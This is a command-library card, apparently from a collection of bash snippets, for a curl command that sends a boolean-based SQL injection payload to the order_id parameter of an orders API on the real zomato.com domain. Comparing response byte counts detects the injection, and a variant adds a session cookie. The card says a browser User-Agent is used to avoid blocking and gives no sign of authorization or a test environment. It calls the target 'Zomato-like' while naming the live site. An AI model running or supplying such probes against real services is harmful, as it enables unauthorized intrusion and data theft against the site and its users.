---
data: >-
  curl -X GET "https://www.zomato.com/api/orders?order_id='-if(1=2,'0','1')-'"
  -H "User-Agent: Mozilla/5.0" -s | wc -c
tags:
  - sqli
  - testing
type: command
executor: bash
platforms:
  - Linux
  - macOS
id: 2f3931cd-ed5d-4430-bf47-9c8e53ccdbec
created_at: '2025-12-14T03:15:30.564Z'
updated_at: '2025-12-14T03:15:30.564Z'
verified: false
validated: true
submitted: true
---
# curl-test-sqli-payload

## Command

```bash
curl -X GET "https://www.zomato.com/api/orders?order_id='-if(1=2,'0','1')-'" -H "User-Agent: Mozilla/5.0" -s | wc -c
```

## Description

This command uses curl to send a GET request to a Zomato-like endpoint with a boolean SQL injection test payload in the order_id parameter, then pipes the silent output to wc -c to measure response length for injection detection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies HTTP method | Yes |
| `order_id='-if(1=2,'0','1')-'` | URL-encoded payload in query param | Yes |
| `-H "User-Agent: ..."` | Mimics browser to avoid blocking | No |
| `-s` | Silent mode, no progress bar | Yes |
| `| wc -c` | Counts bytes in response | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://www.zomato.com/api/orders?order_id='-if(1=2,'0','1')-'" -s | wc -c
```

### Advanced Usage

```bash
curl -X GET "https://www.zomato.com/api/orders?order_id='-if(1=2,'0','1')-'" -H "Cookie: session=abc" -s -w "%{http_code} %{size_download}" | wc -c
```

## Expected Output

A number representing response bytes, e.g., "342", which should differ from a baseline legitimate request (e.g., 500 bytes) to indicate successful injection.

## Related

- [[Related Procedure: Test-Order-ID-for-SQL-Injection]]
